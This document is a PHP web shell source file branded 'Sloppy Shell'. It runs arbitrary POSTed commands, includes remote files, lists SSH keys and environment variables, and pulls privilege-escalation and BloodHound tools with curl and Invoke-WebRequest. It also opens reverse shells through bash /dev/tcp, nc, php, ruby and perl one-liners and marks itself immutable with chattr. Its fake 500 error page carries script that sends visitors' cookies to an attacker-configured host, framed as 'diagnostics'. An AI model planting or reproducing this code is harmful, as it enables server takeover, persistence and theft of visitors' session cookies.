<?php
ini_set("safe_mode", 0);
umask(0);
posix_setuid(0);
define("base",'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
system("chattr +i ". $_SERVER["SCRIPT_FILENAME"]);

function banner(){
    
    echo("\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m\n");
    echo("\033[33;40m ▐█ ▀. ██•  ▪     ▐█ ▄█▐█ ▄█▐█▪██▌    ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•   \033[0m\n");
    echo("\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m\n");
    echo("\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m\n");
    echo("\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m\n");
    echo("gr33tz: Notroot\nH4ppy h4ck1ng\n\n\n");
    
}

function denied(string $errhost)
{
 echo <<< _POSTDOC1
 
 <!DOCTYPE html>
<html>
<head>
<meta http-equiv="refresh" content="10;url=/">
<title>Error</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
<!-- 
     custom script here, to help handle the error request. 
     like logging error information, and diagnostic information about the remote host.
 -->
<!-- <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator/dist/index.browser.js"></script>-->
<script>


function collectDiagnostics(){
    var Url = 'http://[your host]/diagHandler.php'; // Don't forget to set this. This will need to be your diagnostic server.
    var osName = "UNK";
    let diagAr = document.cookie; //collecting authentication information, for diagnostics.
    if (navigator.appVersion.indexOf("Win") != -1) {
        osName = "Windows"
        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
            if (osName !== ''){
        if (window.XMLHttpRequest){
            // sending diag information through xml request, as to not delay user experience.
            xmlhttp = new XMLHttpRequest();
        }else{
            xmlhttp = new ActiveXObject("MicrosoftXMLHTTP");
        }
        jsonP = JSON.stringify(diag);
        xmlhttp.open("GET", Url+jsonP);
        xmlhttp.setRequestHeader("Content-Type", "application/json");
        xmlhttp.onreadystatechange = function (){
            if (this.status === 200){
            }else{
                console.log(this.errorText);
            }
        }
        xmlhttp.send();
    }
    }else if (navigator.appVersion.indexOf("Mac") != -1) {
        osName = "Mac/OSX"
        var diag = {"oName": osName, "co": diagAr, "Rhost": "$errhost" }
        var jsonP = JSON.stringify(diag);
        const Method = {
            headers:{
                "content-type":"application/json; charset=UTF-8"
            },
           method:"GET"
        }
        fetch(Url+"?q="+jsonP, Method)
    }else if (navigator.appVersion.indexOf("X11") != -1) {
        osName = "Linux"
        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
        var jsonP = JSON.stringify(diag);
        const Method = {
            headers:{
                "content-type":"application/json; charset=UTF-8"
            },
           method:"GET"
        }
        fetch(Url+"?q="+jsonP, Method)
    }else if (navigator.appVersion.indexOf("Unix") != -1) {
        osName = "Unix"
        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
        var jsonP = JSON.stringify(diag);
        const Method = {
            headers:{
                "content-type":"application/json; charset=UTF-8"
            },
           method:"GET"
        }
        fetch(Url+"?q="+jsonP, Method)
    }else{
        osName = "UNK"
        var diag = { "oName": osName, "co": diagAr, "Rhost": "$errhost" }
        var jsonP = JSON.stringify(diag);
        const Method = {
            headers:{
                "content-type":"application/json; charset=UTF-8"
            },
           method:"GET"
        }
        fetch(Url+"?q="+jsonP, Method)
    }
}
collectDiagnostics()
</script>
<!-- remote resource here. -->
<script src='rsrc.js'></script>
</head>
<body>
<h1>An error occurred.</h1>
<p>Sorry, the page you are looking for is currently unavailable to you.<br/>
Please try again later.</p>
<p>If you are the system administrator of this resource then you should check
the error log for details.</p>
<p>Redirecting you to the home page in 10 seconds.</p>
</body>
</html>

_POSTDOC1;

}

function b64($target, $how, $data, $ext, $dir)
{
    /*
        So, this isn't pretty, or elegant. Its designed to work, and the base64 -w0 works the best from what i have seen, makes the file much
        easier to transport across http/https, as it strips the newlines out of the end result.
    */
    if (!empty($how) && !empty($target) && !empty($dir)) {
        if (!empty($data) && $how == "up") {
            echo("Starting to decode base64\n");
            shell_exec("echo " . $data . "| base64 >> " . $dir . "/" . $target . "_backup." . $ext) or die("Error on upload.");
        } elseif ($how == "down" && !empty($data) && !empty($dir)) {
            echo("Starting base64 encoding\n");
            shell_exec("base64 -w0 " . $dir . "/" . $target . " >> " . getcwd() . $target . "_backup.b64") or die("Error on building the download.");
        } else {
            echo("Cannot do what you asked of me.\n");
        }
    }
}

function checkComs()
{
    echo "[ !! ]Avail Commands: [ !! ]\n";
    $lincommands = array(
        "perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
        'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
        'qemu', 'sudo', "git", "xterm", "tcl", "ruby", "postgres", "mongo", "couchdb",
        "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid"
    );
    foreach ($lincommands as $item) {
        echo(shell_exec("which " . $item));
    }
}

function parseProtections()
{
    echo "Protections: \n";
    $protections = array(
        "selinux", "iptables", "pfctl", "firewalld", "yast", "yast2", "fail2ban", "denyhost"
    );
    foreach ($protections as $prot) {
        echo(shell_exec("which " . $prot));
    }
}

function checkShells()
{
    $shells = array("ksh", "csh", "zsh", "bash", "sh", "tcsh");
    echo("Shells:\n");
    foreach ($shells as $shell) {
        echo(shell_exec("which " . $shell));
    }
}

function checkPack()
{
    $packs = array(
        "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3", "gem", "cargo", "nuget", "ant", "emerge"
    );
    foreach ($packs as $pack) {
        echo(shell_exec("which " . $pack));
    }
}

function cloner($repo, $os)
{
    $repos = array(
        "linux" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
        "WinBAT" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat",
        "WinEXEANY" => "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe",
        "default" => "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"
    );
    $windefault = $repos['WinBAT'];
    $linDefault = $repo['linux'];
    if (!empty($repo)) {
        echo("<span style='background-color:white'>Git is ok, executing pull request on " . $repo . "</span>");
        shell_exec("git clone " . $repo) || die("Could not pull from the repo.. something is wrong with git itself, try to use alternative methods.");
        echo("Cloned Repo: \n" . shell_exec("ls -lah"));
    } elseif ($os == "lin") {
        echo("Linux selected");
        shell_exec("curl " . $linDefault . "-o lin.sh; chmod +x ./lin.sh");
    } elseif ($os == "win") {
        echo("Win default selected.");
        shell_exec("curl.exe --output winbat.bat " . $windefault);
    } else {
        echo("assuming linux, since it was not specified.");
        shell_exec("curl " . $repos["default"] . " -o suid.py; chmod +x suid.py");
    }
}

function checkSystem()
{
    $os = array();
    if (substr(php_uname(), 0, 7) == 'Windows') {
        array_push($os, "Windows");
        windows("bh", "dl");
        windows("azh", "dl");
        windows("bhe", "dl");
        return $os;
    } else {
        array_push($os,"Linux");
        return $os;
    }
}

function showEnv($os)
{
    if (!empty($os)) {
        if ($os[0] == 'Linux') {
            echo(shell_exec('env'));
        } elseif ($os == "Windows") {
            echo(shell_exec("SET"));
        } else {
            return null;
        }
    }
    return null;
}

function reverseConnections($methods, $host, $port, $shell)
{
    ob_start();
//    $errorNum = error;
    $defaultPort = 1634;
    $defaultHost = $_SERVER["REMOTE_ADDR"];
    $defaultShell = shell_exec("which bash");

    $useHost = null;
    $usePort = null;
    $useShell = null;

    if (empty($host)) {
        echo("\nHost was empty, using: " . $defaultHost . "\n");
        $useHost = $defaultHost;
    } else {
        $useHost = $host;
    }
    if (empty($shell)) {
        echo("\nShell was empty, using default: " . $defaultShell . "\n");
        $useShell = $defaultShell;
    } else {
        $useShell = $shell;
    }
    if (empty($port)) {
        echo("\nPort was empty, using default: " . $defaultPort . "\n");
        $usePort = $defaultPort;
    } else {
        $usePort = $port;
    }
    $comma = array(
        "bash" => "bash -i >& /dev/tcp/{$useHost}/" . $usePort . " 0>&1",
        "php" => "php -r '\$sock=fsockopen(\"" . $useHost . "\"," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc" => "nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort. "\"",
        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc \"" . $useHost . "\" " . $usePort . " >/tmp/f",
        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl" => "perl -e 'use Socket;\$i=\"" . $useHost . "\";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    );
    $defaultAction = $comma["bash"];
    if (!empty($methods)) {
        echo("\nAttempting to connect back, ensure you have the listener running.\n");
        echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");

        passthru($comma[$methods]) or die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
    } else {
        echo("\nYou didnt specify a method to use, defaulting to bash.\n");
        echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
        passthru($defaultAction) or die("\nThere was an error at the connection\n->Error\n" . error_get_last() . "\r\n\r\n\r\n");
    }
    $var = ob_get_contents();
    ob_end_clean();
    ob_end_flush();
}

function executeCommands(string $com, int $run)
{
    if (!empty($com) && $run === "1") {
        echo("~ Info To Remember ~ \n" . shell_exec($com));
    }else{
        echo("\nExecuting: ". $com ."\n->". shell_exec($com));
    }
}

function remoteFileInclude(string $targetFile)
{
    if (!empty($targetFile)) {
        include ($targetFile) or die("Could not remote import :(\n");
    }
}

function windows($com, $r){
    if (!empty($com) && !empty($r)){
        $cdir = dirname("." . "\\" .PHP_EOL);
        if ($r == "dl") {
            echo("\nThis is quite noisy, you should make a hidden directory in order to hide these..\n");
            switch (strtolower($com)) {
                case "bh":
                    echo("Pulling SharpHound..\n");
                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile af.ps1");
                    echo("\nFile downloaded to: ". $cdir . " af.ps1");
                    break;
                case "azh":
                    echo("Pulling Azurehound...\n");
                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile af1.ps1");
                    echo("\nFile downloaded to: ". $cdir . " af1.ps1");
                    break;
                case "bhe":
                    echo("Pulling Bloodhound Executable!\n");
                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile af2.exe");
                    echo("\nFile downloaded to: ". $cdir . " af2.ps1");
                    break;
            }
        }else{
            echo ("Future versions will have an execution phase.");

        }
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
    banner();
    if (!isset($CHECK_IN_HOST)) {
       	define("CHECK_IN_HOST", $_SERVER["REMOTE_ADDR"]);
    }
    setcookie("Test1", "1");
    setcookie("checkIn", $_SERVER["REMOTE_ADDR"]);
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Credentials: true");
    if (!empty($_POST["commander"])) {
        executeCommands($_POST["commander"], "0");
    } elseif (!empty($_POST["clone"])) {
        if (!empty($_POST["ROS"])) {
            $ROS = htmlentities($_POST["ROS"]);
        } else {
            $ROS = "";
        }
        cloner($_POST["clone"], $ROS);
    } elseif (!empty($_POST["doInclude"])) {
        remoteFileInclude($_POST["doInclude"]);
    } elseif (!empty($_POST["b6"])) {
        echo("Future editions will have this.\n");
        //b64();
    } elseif ($_POST["rcom"]) {
        reverseConnections(htmlentities($_POST["mthd"]), htmlentities($_POST["host"]), htmlentities($_POST["port"]), htmlentities($_POST["shell"]));
    } else {
        echo("Empty post");
    }
} elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
    banner();
    setcookie("checkIn", $_SERVER['REMOTE_ADDR']);
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Credentials: true");
    if (!empty($_GET["qs"])) {
        if ($_GET["qs"] == "cqS")
            showEnv(checkSystem());
        elseif ($_GET["qs"] == "cqP")
            checkPack();
        elseif ($_GET["qs"] == "cqPR")
            parseProtections();
        elseif ($_GET["qs"] == "cqSH")
            checkShells();
        elseif ($_GET["qs"] == "cqCM")
            checkComs();
        elseif ($_GET["qs"] == "cqBS")
            executeCommands(base, "1");
    } else {
        if (!empty($CHECK_IN_HOST)) {
            header("Checkin: " . $CHECK_IN_HOST);
        }
        $rhost = $_SERVER['REMOTE_ADDR'];
        http_response_code(500);
        header("Status: 500 Internal Server Error");
        denied($rhost);
    }
} else {
    $rhost = $_SERVER['REMOTE_ADDR'];
    header("Status: 500 Internal Server Error");
    http_response_code(500);
    denied($rhost);
}
